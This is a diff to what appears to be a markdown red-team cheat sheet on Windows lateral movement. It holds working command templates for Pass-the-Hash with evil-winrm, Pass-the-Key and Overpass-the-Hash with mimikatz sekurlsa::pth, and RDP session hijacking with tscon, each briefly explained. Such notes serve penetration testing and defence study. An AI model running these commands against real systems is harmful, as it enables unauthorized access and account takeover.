@@ -185,11 +185,11 @@ Unregister-ScheduledTask -CimSession $Session -TaskName $TaskName
 ## NTLM
 
 ### Pass-the-Hash
-As a result of extracting credentials from a host an attacker might get NTLM hash. Sometimes it can be too hard to crack the hash but it's possible to authenticate with the hash itself.
+As a result of extracting credentials from a host an attacker might get NT hash. Sometimes it can be too hard to crack the hash but it's possible to authenticate with the hash itself.
 
 ```bash
-# Get shell using NTLM hash
-evil-winrm -i <victim-ip> -u <username> -H <ntml-hash>
+# Get shell using NT hash
+evil-winrm -i <victim-ip> -u <username> -H <nt-hash>
 ```
 
 ## Kerberos
@@ -209,7 +209,26 @@ dir \\<dc-ip>\C$
 ```
 
 ### Pass-the-Key
+When a user requests a TGT it must prove its identity to the KDC. The key derived from user's password is used for this purpose (both the KDC and the user posses the key). The key is used to encrypt a timestamp sent by the user during the TGT requesting process. There is a couple possible key formats (DES, RC4, AES-128, AES-256). They depends on the algorithm used to encrypt the timestamp (Windows version and Kerberos configuration). If an attacker obtain any of these keys, he can ask the KDC for a TGT without providing the actual user's password.
+
+```powershell
+#Run a :command as a different :user using :key
+./mimikatz.exe 
+> sekurlsa::pth /user:<user> /rc4:key /run:<command>
+```
+
+> **NOTE**: Available algorithms: `rc4`, `aes128`, `aes256`.
+
+#### Overpass-the-Hash
+If the RC4 algorithm is used, the RC4 key is equal to the NT hash of a user. It means that if an attacker is able to steal the NT hash, he would be able to request the TGT even if the NTLM authentication is disabled.
+
+## RDP hijacking
 TBD
 
-### Overpass-the-Hash
-TBD
+```powershell
+# List sessions
+query session
+
+# Hijack
+tscon <id> /dest:<current-connection>
+```
